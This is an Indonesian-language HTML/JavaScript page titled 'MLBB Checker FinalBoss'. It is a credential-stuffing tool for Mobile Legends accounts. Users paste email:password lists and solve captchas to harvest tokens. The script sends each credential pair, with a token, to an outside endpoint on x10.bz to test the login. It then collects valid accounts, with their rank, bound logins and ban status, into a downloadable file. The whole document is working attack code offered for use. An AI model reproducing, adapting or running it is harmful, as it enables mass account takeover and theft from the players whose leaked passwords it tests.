<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MLBB Checker FinalBoss</title>
    <script src="https://cstaticdun.126.net/load.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
        :root{--bg-color:#12121f;--card-color:#1a1a2e;--primary-color:#4a47a3;--primary-hover:#6a67ce;--secondary-color:#ffc107;--danger-color:#dc3545;--text-color:#e0e0e0;--text-muted:#8c8c8e;--success-color:#28a745;--border-color:#33334d;}
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Poppins',sans-serif;background-color:var(--bg-color);color:var(--text-color);padding:20px;}
        .main-container{display:flex;flex-wrap:wrap;gap:20px;max-width:1800px;margin:0 auto;}
        .panel{flex:1;min-width:350px;display:flex;flex-direction:column;gap:20px;}
        .card{background-color:var(--card-color);border-radius:12px;padding:25px;border:1px solid var(--border-color);box-shadow:0 4px 20px rgba(0,0,0,0.2);}
        .card-title{font-weight:600;margin-bottom:20px;display:flex;align-items:center;gap:10px;}
        .captcha-solver-panel .card-title{justify-content:space-between;}
        .token-counter{font-size:1rem;font-weight:700;padding:5px 10px;border-radius:6px;background-color:var(--primary-color);color:white;}
        .captcha-container{margin-bottom:15px;padding:10px;background-color:var(--bg-color);border-radius:8px;}
        textarea{width:100%;background-color:var(--bg-color);border:1px solid var(--border-color);border-radius:8px;padding:12px;color:var(--text-color);font-family:'Poppins',sans-serif;font-size:0.95rem;resize:vertical;}
        textarea:focus{outline:none;border-color:var(--primary-color);}
        .button-group{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:20px;}
        button{padding:12px 15px;border:none;border-radius:8px;font-size:0.9rem;font-weight:600;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:8px;}
        button:hover:not(:disabled){transform:translateY(-2px);}
        button:disabled{cursor:not-allowed;opacity:0.5;}
        #startButton{background-color:var(--primary-color);color:white;}
        #pauseButton{background-color:var(--secondary-color);color:#12121f;}
        #stopButton{background-color:var(--danger-color);color:white;}
        .stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;}
        .stat-item{background-color:rgba(0,0,0,0.2);padding:10px 15px;border-radius:6px;font-weight:500;display:flex;justify-content:space-between;border-left:4px solid var(--text-muted);}
        .stat-item.valid{border-color:var(--success-color);}
        .stat-item.error{border-color:var(--danger-color);}
        #resultsLog{background-color:var(--bg-color);height:600px;overflow-y:auto;border-radius:8px;padding:8px;border:1px solid var(--border-color);display:flex;flex-direction:column;gap:8px;}
        .log-item-simple{padding:8px 12px;border-radius:6px;background-color:var(--card-color);font-family:'Courier New',Courier,monospace;word-break:break-all;}
        .log-item-simple.info{color:#0dcaf0;}
        .log-item-simple.error{color:var(--danger-color);}
        .log-card{background-color:var(--card-color);border-radius:8px;border:1px solid var(--border-color);overflow:hidden;border-left:5px solid var(--success-color);}
        .log-card.banned{border-left-color:var(--danger-color);}
        .log-summary{padding:10px 15px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;}
        .summary-main{display:flex;align-items:center;gap:15px;flex-grow:1;}
        .summary-main .ign{font-weight:600;color:white;}
        .summary-main .rank{font-style:italic;color:var(--text-muted);}
        .log-details{display:none;padding:15px;background-color:rgba(0,0,0,0.2);display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;}
        .detail-item .detail-label{font-size:0.8rem;color:var(--text-muted);}
        .detail-item .detail-value{font-weight:600;}
        .detail-value.banned-true{color:var(--danger-color);}
        .download-buttons{margin-top:20px;display:grid;grid-template-columns:1fr 1fr;gap:10px;}
    </style>
</head>
<body>

    <div class="main-container">
        <div class="panel captcha-solver-panel"><div class="card"><div class="card-title"><span><i class="fas fa-shield-alt"></i> Captcha Solver</span><span class="token-counter">Tokens: <span id="tokenCount">0</span></span></div><p style="font-size:0.8rem;color:var(--text-muted);margin-bottom:15px;">Selesaikan captcha untuk mengumpulkan token. Proses akan otomatis mengambil token dari sini.</p><div class="captcha-container"><div id="captcha1"></div></div><div class="captcha-container"><div id="captcha2"></div></div><div class="captcha-container"><div id="captcha3"></div></div></div></div>
        <div class="panel control-panel"><div class="card"><h2 class="card-title"><i class="fas fa-cogs"></i> Kontrol & Input</h2><textarea id="accountList" rows="12" placeholder="Masukkan list akun di sini...&#10;Format: email:password"></textarea><div class="button-group"><button id="startButton"><i class="fas fa-play"></i> Mulai</button><button id="pauseButton" disabled><i class="fas fa-pause"></i> Jeda</button><button id="stopButton" disabled><i class="fas fa-stop"></i> Stop</button></div></div><div class="card"><h2 class="card-title"><i class="fas fa-chart-line"></i> Statistik</h2><div class="stats-grid"><div class="stat-item">Total: <span id="totalCount">0</span></div><div class="stat-item">Checked: <span id="checkedCount">0</span></div><div class="stat-item valid">Valid: <span id="validCount">0</span></div><div class="stat-item error">Error: <span id="errorCount">0</span></div></div></div></div>
        <div class="panel results-panel"><div class="card"><h2 class="card-title"><i class="fas fa-tasks"></i> Hasil Pengecekan</h2><div id="resultsLog"><div class="log-item-simple info">Selamat datang! Selesaikan captcha, masukkan list akun, lalu klik 'Mulai'.</div></div><div class="download-buttons"><button id="downloadValidButton"><i class="fas fa-download"></i> Download Valid</button><button id="downloadOtherButton"><i class="fas fa-download"></i> Download Lainnya</button></div></div></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const REQUEST_DELAY_MS = 1000;
            let tokens = [];
            let accounts = [], currentIndex = 0, isChecking = false, isPaused = false, pausedForToken = false;
            let results = { valid: [], others: [] };
            let stats = { total: 0, checked: 0, valid: 0, error: 0 };

            const accountListEl = document.getElementById('accountList');
            const startButton = document.getElementById('startButton');
            const pauseButton = document.getElementById('pauseButton');
            const stopButton = document.getElementById('stopButton');
            const resultsLogEl = document.getElementById('resultsLog');
            const downloadValidButton = document.getElementById('downloadValidButton');
            const downloadOtherButton = document.getElementById('downloadOtherButton');
            const tokenCountEl = document.getElementById('tokenCount');
            const counters = { total: document.getElementById('totalCount'), checked: document.getElementById('checkedCount'), valid: document.getElementById('validCount'), error: document.getElementById('errorCount') };
            
            const captchaKey = "fef5c67c39074e9d845f4bf579cc07af";
            const updateTokenCounter = () => { tokenCountEl.textContent = tokens.length; };

            function loadCaptcha(captchaId, elementId) {
                initNECaptcha({
                    captchaId: captchaId, element: elementId, mode: "embed",
                    onVerify: function (err, data) {
                        if (!err) {
                            tokens.push(data.validate);
                            updateTokenCounter();
                            if (isChecking && pausedForToken) {
                                pausedForToken = false; isPaused = false;
                                logSimple('Token diterima! Melanjutkan proses pengecekan...', 'info');
                                checkNextAccount();
                            }
                            setTimeout(() => loadCaptcha(captchaId, elementId), 500);
                        }
                    }
                });
            }
            loadCaptcha(captchaKey, "#captcha1"); loadCaptcha(captchaKey, "#captcha2"); loadCaptcha(captchaKey, "#captcha3");

            const logSimple = (message, type) => {
                const logItem = document.createElement('div');
                logItem.className = `log-item-simple ${type}`;
                logItem.innerHTML = `<i class="fas fa-info-circle"></i> [${new Date().toLocaleTimeString()}] ${message}`;
                resultsLogEl.appendChild(logItem);
                resultsLogEl.scrollTop = resultsLogEl.scrollHeight;
            };
            
            const createResultCard = (data, accountLine) => {
                const isBanned = data.banned === 'True';
                const card = document.createElement('div');
                card.className = `log-card ${isBanned ? 'banned' : ''}`;
                card.innerHTML = `<div class="log-summary"><div class="summary-main"><span class="ign">${data.ign||'N/A'}</span><span class="rank">${data.rank||'N/A'}</span></div><span class="details-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="log-details"><div class="detail-item"><span class="detail-label">Akun</span><span class="detail-value">${accountLine}</span></div><div class="detail-item"><span class="detail-label">Level</span><span class="detail-value">${data.level||'N/A'}</span></div><div class="detail-item"><span class="detail-label">Highest Rank</span><span class="detail-value">${data.highest_rank||'N/A'}</span></div><div class="detail-item"><span class="detail-label">ID (Zone)</span><span class="detail-value">${data.role_id||'N/A'} (${data.zone_id||'N/A'})</span></div><div class="detail-item"><span class="detail-label">Binds</span><span class="detail-value">${data.binds||'N/A'}</span></div><div class="detail-item"><span class="detail-label">Banned</span><span class="detail-value ${isBanned?'banned-true':''}">${data.banned} ${isBanned?`(Hingga: ${data.ban_expiry})`:''}</span></div></div>`;
                resultsLogEl.appendChild(card);
                resultsLogEl.scrollTop = resultsLogEl.scrollHeight;
            };

            const updateStats = () => Object.keys(stats).forEach(key => counters[key].textContent = stats[key]);
            const setButtonsState = (start, pause, stop) => { startButton.disabled = !start; pauseButton.disabled = !pause; stopButton.disabled = !stop; };
            
            const fullReset = () => {
                setButtonsState(true, false, false);
                pauseButton.innerHTML = '<i class="fas fa-pause"></i> Jeda';
            };
            
            const checkNextAccount = async () => {
                if (!isChecking || isPaused) return;
                if (currentIndex >= accounts.length) {
                    logSimple('🎉 Pengecekan Selesai Semua!', 'info');
                    fullReset();
                    return;
                }
                if (tokens.length === 0) {
                    logSimple('<b>Token habis! Selesaikan captcha di sebelah kiri untuk melanjutkan...</b>', 'error');
                    isPaused = true; pausedForToken = true; return;
                }

                const accountLine = accounts[currentIndex];
                const [email, password] = accountLine.includes(':') ? accountLine.split(/:(.+)/) : accountLine.split(/\|(.+)/);
                const token = tokens.shift();
                updateTokenCounter();
                
                logSimple(`[${stats.checked + 1}/${stats.total}] Mengecek: ${email}...`, 'info');
                const endpoint = `https://suneoxjarell.x10.bz/accountmtapi/connect?user=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}&captcha=${token}`;
                
                try {
                    const response = await fetch(endpoint);
                    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
                    const data = await response.json();
                    processApiResponse(data, accountLine);
                } catch (e) {
                    stats.error++; results.others.push(`${accountLine} | [NETWORK/FETCH ERROR]`);
                    logSimple(`Error pada ${accountLine}: ${e.message}`, 'error');
                } finally {
                    stats.checked++; currentIndex++; updateStats();
                    setTimeout(checkNextAccount, REQUEST_DELAY_MS);
                }
            };

            const processApiResponse = (data, accountLine) => {
                if (data.status === 'valid') {
                    stats.valid++;
                    results.valid.push(`${accountLine} | IGN: ${data.ign} | Rank: ${data.rank} | Banned: ${data.banned}`);
                    createResultCard(data, accountLine);
                } else {
                    stats.error++;
                    const message = data.message || JSON.stringify(data);
                    results.others.push(`${accountLine} | [${message}]`);
                    logSimple(`Gagal - ${accountLine} -> Pesan: ${message}`, 'error');
                }
            };
            
            // --- LOGIKA UTAMA YANG DIPERBAIKI ---
            startButton.addEventListener('click', () => {
                const parsedAccounts = accountListEl.value.split(/[\r\n]+/).filter(line => line.trim() !== '');

                console.clear();
                console.log(`[DIAGNOSTIK] Tombol Mulai Ditekan.`);
                console.log(`[DIAGNOSTIK] Ditemukan ${parsedAccounts.length} akun setelah parsing.`);
                console.log(`[DIAGNOSTIK] Ditemukan ${tokens.length} token yang tersedia.`);

                if (parsedAccounts.length === 0) {
                    logSimple('GAGAL MEMULAI: List akun kosong atau formatnya salah.', 'error');
                    alert('List akun kosong atau formatnya salah!');
                    return;
                }
                if (tokens.length === 0) {
                    logSimple('GAGAL MEMULAI: Token CAPTCHA kosong.', 'error');
                    alert('Selesaikan minimal satu captcha terlebih dahulu!');
                    return;
                }
                
                // INISIALISASI STATE BARU (BUKAN RESET)
                accounts = parsedAccounts; // PENTING: Gunakan variabel yang baru diparsing
                currentIndex = 0;
                isChecking = true;
                isPaused = false;
                pausedForToken = false;
                results = { valid: [], others: [] };
                stats = { total: accounts.length, checked: 0, valid: 0, error: 0 };

                resultsLogEl.innerHTML = '';
                updateStats();
                setButtonsState(false, true, true);
                logSimple(`Memulai pengecekan untuk ${stats.total} akun. Delay antar request: ${REQUEST_DELAY_MS / 1000} detik.`, 'info');
                checkNextAccount();
            });

            pauseButton.addEventListener('click', () => {
                if (!isChecking) return;
                isPaused = !isPaused; pausedForToken = false;
                pauseButton.innerHTML = isPaused ? '<i class="fas fa-play"></i> Lanjut' : '<i class="fas fa-pause"></i> Jeda';
                logSimple(isPaused ? 'Proses dijeda oleh pengguna.' : 'Proses dilanjutkan...', 'info');
                if (!isPaused) checkNextAccount();
            });

            stopButton.addEventListener('click', () => {
                isChecking = false; // Hentikan loop
                logSimple('Proses dihentikan oleh pengguna.', 'error');
                fullReset();
            });

            // Sisa event listener lainnya (download, expand card)
            resultsLogEl.addEventListener('click', (e) => {
                const summary = e.target.closest('.log-summary');
                if (summary) {
                    const details = summary.nextElementSibling;
                    const icon = summary.querySelector('.details-toggle i');
                    const isExpanded = details.style.display === 'grid';
                    details.style.display = isExpanded ? 'none' : 'grid';
                    icon.className = isExpanded ? 'fas fa-chevron-down' : 'fas fa-chevron-up';
                }
            });
            const downloadTxt = (filename, content) => {
                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = filename;
                link.click();
            };
            downloadValidButton.addEventListener('click', () => {
                if (results.valid.length === 0) return alert('Tidak ada akun valid untuk diunduh.');
                downloadTxt('akun_valid.txt', results.valid.join('\n'));
            });
            downloadOtherButton.addEventListener('click', () => {
                if (results.others.length === 0) return alert('Tidak ada data akun lain untuk diunduh.');
                downloadTxt('akun_lainnya.txt', results.others.join('\n'));
            });
        });
    </script>
</body>
</html>
